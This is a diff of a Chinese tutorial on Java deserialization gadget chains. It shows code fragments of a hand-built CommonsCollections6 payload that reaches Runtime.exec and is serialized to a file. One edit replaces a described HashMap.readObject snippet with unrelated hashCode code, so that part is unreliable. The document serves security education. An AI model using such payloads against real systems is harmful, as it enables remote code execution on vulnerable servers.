@@ -101,7 +101,7 @@ chain.transform(null);   // 依次执行 1→2→3→4 → Runtime.getRuntime().
 ```
 > 为什么不直接 `new InvokerTransformer("exec", ...)` 一步到位？因为 `Runtime` 构造方法是私有的，必须先反射 `getMethod("getRuntime")` 拿到方法、再 `invoke` 得到实例，最后才能 `exec`。这就是 payload 里常见"getMethod → invoke → exec"三段式的原因。
 
-![image-20260810092032949](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810092032949.png)
+![image-20260810092032949](./2026-07-24-Java反序列化Gadget链入门.assets/image-20260810092032949.png)
 
 到这里，"有 `transform()` 调用 → 就执行命令"已经成立。现在的问题是：**反序列化时，谁会去调 `transform()`？**
 
@@ -116,6 +116,8 @@ Map lazyMap = LazyMap.decorate(new HashMap(), chain);   // factory = chain
 lazyMap.get("任何不存在的key");   // → chain.transform("...") → RCE！
 ```
 现在链条推进到：`LazyMap.get(key) → factory.transform(key) → ... → exec`。
+
+![image-20260810093653867](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810093653867.png)
 
 ---
 
@@ -132,11 +134,10 @@ entry.hashCode();   // → lazyMap.get("key") → chain.transform → RCE
 而 `HashMap.readObject()` 会对每个 key 调 `hashCode()`（见第二节）：
 
 ```java
-// HashMap.readObject 内部（简化）
-for (int i = 0; i < mappings; i++) {
-    K key = (K) s.readObject();
-    putVal(hash(key), key, value, false, false);   // hash(key) 会调 key.hashCode()
-}
+    public int hashCode() {
+        Object value = this.getValue();
+        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
+    }
 ```
 所以让 `HashMap` 的 key 是那个 `TiedMapEntry`，反序列化就自动触发整条链。
 
@@ -177,9 +178,11 @@ entry.hashCode();   // ← 触发点，等价于整条链
 ```
 > 这一步很重要：**先证明"手工触发能通"，再谈反序列化触发**。把整条链拆成"触发点方法调用" + "触发源是谁"，是理解所有链的通用方法。
 
+![image-20260810093854378](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810093854378.png)
+
 ### 8.2 再封装成真正的反序列化 payload
 
-> ⚠️ **先抄这个辅助方法**：下面主代码用到的 `setFieldValue` 是**自定义方法**，不是 JDK 也不是 commons-collections 提供的，需要你自己复制进类里——漏掉它编译会报"找不到符号"。它依赖 `import java.lang.reflect.Field;`，且方法抛 `Exception`，调用它的 `main` 要声明 `throws Exception`。
+> ⚠️ **先抄这个辅助方法**：下面主代码用到的 `setFieldValue` 是**自定义方法**
 
 ```java
 // 辅助方法：反射修改 ChainedTransformer 的私有字段 iTransformers
@@ -216,9 +219,9 @@ oos.writeObject(expMap);
 ObjectInputStream ois = new ObjectInputStream(new FileInputStream("poc.ser"));
 ois.readObject();   // ← 弹出计算器
 ```
-> 这段代码就是 ysoserial 里 `CommonsCollections6` 的手写简化版。**理解它的过程 = 理解所有"基于集合的 gadget 链"**。LazyMap/TiedMapEntry/ChainedTransformer 全部来自 `commons-collections 3.2.1`（Shiro 1.2.4 等老框架自带）。
+> 这段代码就是 ysoserial 里 `CommonsCollections6` 的手写简化版。LazyMap/TiedMapEntry/ChainedTransformer 全部来自 `commons-collections 3.2.1`（Shiro 1.2.4 等老框架自带）。
 
----
+![image](/images/2026-07-24-Java反序列化Gadget链入门.assets/image-20260810094947625.png)
 
 ## 九、另一个更强的 sink：TemplatesImpl（加载任意字节码）
 
